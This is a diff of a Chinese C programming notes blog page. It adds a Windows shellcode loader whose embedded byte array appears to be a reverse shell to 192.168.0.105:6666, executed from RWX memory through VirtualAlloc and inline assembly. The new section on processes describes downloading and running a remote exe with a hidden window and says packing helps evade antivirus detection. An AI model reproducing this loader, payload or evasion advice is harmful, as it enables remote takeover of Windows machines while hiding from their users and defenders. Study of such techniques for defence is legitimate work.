@@ -9,14 +9,14 @@
 <meta name="author-link" content="">
 <meta name="description" content="C/C&#43;&#43; 笔记" /><meta name="keywords" content='C/C&#43;&#43;' /><meta itemprop="name" content="C语言基础笔记">
 <meta itemprop="description" content="C/C&#43;&#43; 笔记"><meta itemprop="datePublished" content="2022-12-29T18:43:09+08:00" />
-<meta itemprop="dateModified" content="2023-10-31T01:07:08+00:00" />
-<meta itemprop="wordCount" content="21059">
+<meta itemprop="dateModified" content="2023-11-01T14:30:07+00:00" />
+<meta itemprop="wordCount" content="21557">
 <meta itemprop="keywords" content="C/C&#43;&#43;," /><meta property="og:title" content="C语言基础笔记" />
 <meta property="og:description" content="C/C&#43;&#43; 笔记" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://example.org/posts/2022-1229-01/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-12-29T18:43:09+08:00" />
-<meta property="article:modified_time" content="2023-10-31T01:07:08+00:00" />
+<meta property="article:modified_time" content="2023-11-01T14:30:07+00:00" />
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="C语言基础笔记"/>
@@ -33,8 +33,8 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "http:\/\/example.org\/posts\/2022-1229-01\/"
-    },"genre": "posts","keywords": "C\/C\u002b\u002b","wordcount":  21059 ,
-    "url": "http:\/\/example.org\/posts\/2022-1229-01\/","datePublished": "2022-12-29T18:43:09+08:00","dateModified": "2023-10-31T01:07:08+00:00","publisher": {
+    },"genre": "posts","keywords": "C\/C\u002b\u002b","wordcount":  21557 ,
+    "url": "http:\/\/example.org\/posts\/2022-1229-01\/","datePublished": "2022-12-29T18:43:09+08:00","dateModified": "2023-11-01T14:30:07+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
         "@type": "Person",
@@ -205,11 +205,11 @@
 <svg class="icon2" aria-hidden="true">
   <use xlink:href="#icon-qianbi1"></use>
 </svg>
-			约 21059 字</span>&nbsp;<span><i class="111" aria-hidden="true"></i> 
+			约 21557 字</span>&nbsp;<span><i class="111" aria-hidden="true"></i> 
 <svg class="icon2" aria-hidden="true">
   <use xlink:href="#icon-shalou2"></use>
 </svg>
-			预计阅读 43 分钟</span>&nbsp;</div>
+			预计阅读 44 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -298,6 +298,7 @@
     </li>
     <li><a href="#文件分割">文件分割</a></li>
     <li><a href="#虚拟内存加载-shellcode">虚拟内存加载 shellcode</a></li>
+    <li><a href="#进程遍历读写--内存补丁--win32-api调试">进程遍历、读写 | 内存补丁 | win32 api调试</a></li>
   </ul>
 </nav></div>
       </div><div class="content" id="content"><h2 id="创建c文件">创建C文件</h2>
@@ -5499,6 +5500,104 @@
 </span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a</span><span class="s">&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x53\xff\xd5</span><span class="s">&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">code</span> <span class="o">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CopyMemory</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_asm</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span><span class="n">code</span>
+</span></span><span class="line"><span class="cl">        <span class="n">push</span> <span class="n">eax</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ret</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>    
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+
+
+
+    
+
+
+
+<div class="codetitle"></div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _CRT_SECURE_NO_WARNINGS
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span><span class="o">=</span><span class="s">&#34;</span><span class="se">\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x0f\xb7</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x8b</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x58\x20\x01\xd3\x50\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x00\x69\x68\x02\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x1a\x0a\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s">&#34;</span><span class="se">\x00\x53\xff\xd5</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">code</span> <span class="o">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">CopyMemory</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
@@ -5673,16 +5772,17 @@
 <p><strong>内存映射文件函数</strong></p>
 <p>内存映射文件函数相对比较独立，它是为了文件操作的方便性而设立的。
 当对文件进行操作的时候，一般先打开文件，申请一块内存用做缓冲区，再将文件数据循环读入并处理，当文件长度大于缓冲区长度则需要多次读入，每次读入后处理缓冲区边界位置的数据往往是个麻烦问题。</p>
-<p><strong>不同内存管理函数的操作对象</strong></p>
-<p>对比这些函数，可以发现它们涉及的系统资源是各不相同的：</p>
+<p>Windows 可以使用磁盘文件当做虚拟内存，内存映射文件函数使用同样的办法将一个文件直接映射到进程的地址空间中，这样可以通过内存指针用读写内存的办法直接存取文件内容。</p>
+<p>使用 DLL 文件的时候，实际就是使用了内存映射文件，如下：</p>
 <p><img
     class="lazyload"
     src="/svg/loading.min.svg"
-    data-src="image-20231030102549641.png"
-    data-srcset="image-20231030102549641.png, image-20231030102549641.png 1.25x, image-20231030102549641.png 1.25x"
+    data-src="image-20231031153805578.png"
+    data-srcset="image-20231031153805578.png, image-20231031153805578.png 1.25x, image-20231031153805578.png 1.25x"
     data-sizes="auto"
-    alt="image-20231030102549641"
-    title="image-20231030102549641"/></p>
+    alt="image-20231031153805578"
+    title="image-20231031153805578"/></p>
+<p>进程A中的kernel.dll文件在0xccc中，而进程B的kernel.dll文件在0xffff中，虽然位置不同，但都是由同一个物理地址0xccff映射过去的，kernel.dll在物理内存里面只有一份，也就是把0xccff地址的kernel.dll映射到各个进程的虚拟空间里，即各个进程访问的都是同一个kernel.dll文件，不同于静态库，静态库的代码在每一个进程里面都有一份。</p>
 <p><strong>获取内存的当前状态</strong></p>
 <p>为啥要获取内存的当前状态呢 ？</p>
 <p>因为一个进程可以寻址的地址空间是 4GB，但用户可以直接管理的地址空间是多大呢？</p>
@@ -5735,7 +5835,53 @@
 <li>自由状态：没有被映射到实际的物理内存中，线性地址当前也没有被程序使用</li>
 <li>保留状态：保留一个线性地址，现在不用，以后使用，没有映射到实际的物理内存中</li>
 </ul>
-<p>​</p></div><div class="post-reward">
+<h2 id="进程遍历读写--内存补丁--win32-api调试">进程遍历、读写 | 内存补丁 | win32 api调试</h2>
+<p>基础知识补充：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="image-20231031161301432.png"
+    data-srcset="image-20231031161301432.png, image-20231031161301432.png 1.25x, image-20231031161301432.png 1.25x"
+    data-sizes="auto"
+    alt="image-20231031161301432"
+    title="image-20231031161301432"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="image-20231031164514517.png"
+    data-srcset="image-20231031164514517.png, image-20231031164514517.png 1.25x, image-20231031164514517.png 1.25x"
+    data-sizes="auto"
+    alt="image-20231031164514517"
+    title="image-20231031164514517"/></p>
+<p>查看环境变量，也可以cmd下输入set来查看</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="image-20231101101232526.png"
+    data-srcset="image-20231101101232526.png, image-20231101101232526.png 1.25x, image-20231101101232526.png 1.25x"
+    data-sizes="auto"
+    alt="image-20231101101232526"
+    title="image-20231101101232526"/></p>
+<p>查看环境变量，也可以用win32api查看，如下</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="image-20231101101341920.png"
+    data-srcset="image-20231101101341920.png, image-20231101101341920.png 1.25x, image-20231101101341920.png 1.25x"
+    data-sizes="auto"
+    alt="image-20231101101341920"
+    title="image-20231101101341920"/></p>
+<p>远程下载exe，然后执行</p>
+<p>SW_HIDE 是隐藏窗口，而测试的时候，可以用 SH_SHOW 显示窗口，正常会报毒，加壳可以避免一定程度报毒</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="image-20231101105138768.png"
+    data-srcset="image-20231101105138768.png, image-20231101105138768.png 1.25x, image-20231101105138768.png 1.25x"
+    data-sizes="auto"
+    alt="image-20231101105138768"
+    title="image-20231101105138768"/></p>
+<p>除了用 WinExec 外创建进程，还可以用 CreateProcess 创建进程</p></div><div class="post-reward">
     <div class="comment"></div>
     <input type="checkbox" class="reward-input" name="reward" id="fi-reward" hidden />
     <label class="reward-button" for="fi-reward">赞赏</label>
@@ -5747,7 +5893,7 @@
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
-        <span title=2023-10-31&#32;01:07:08>更新于 2023-10-31&nbsp;</span>
+        <span title=2023-11-01&#32;14:30:07>更新于 2023-11-01&nbsp;</span>
       </div></div>
     <div class="post-info-line">
       <div class="post-info-md"><span><a href="https://github.com/ayuxy/Blog_Backup/tree/main/content/posts/2022-1229-01.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
